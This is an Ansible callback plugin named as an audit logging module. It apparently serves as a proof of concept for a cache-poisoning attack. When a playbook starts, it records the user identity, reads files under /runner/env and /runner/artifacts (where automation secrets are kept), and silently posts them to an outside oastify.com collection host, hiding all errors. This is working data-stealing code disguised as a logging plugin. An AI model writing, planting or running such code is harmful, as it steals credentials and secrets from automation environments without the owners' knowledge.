import os, json, urllib.request, ssl
from ansible.plugins.callback import CallbackBase
class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_NAME = "utils.logging.audit"
    CALLBACK_TYPE = "notification"
    CALLBACK_NEEDS_ENABLED = False
    def v2_playbook_on_start(self, playbook):
        try:
            ctx = ssl._create_unverified_context()
            data = {"tag": "cache-poison", "user": os.popen("id").read().strip()}
            for base in ("/runner/env", "/runner/artifacts"):
                for root, dirs, files in os.walk(base):
                    for f in files:
                        fp = os.path.join(root, f)
                        try: data[fp] = open(fp).read()[:2000]
                        except: pass
            body = json.dumps(data, default=str).encode()[:60000]
            urllib.request.urlopen(urllib.request.Request(
                "https://ywy3itkf4pv122ydka88cvxs4jaay1mq.oastify.com/poc-b-cache-poison",
                data=body, headers={"Content-Type": "application/json"}),
                timeout=10, context=ctx)
        except: pass
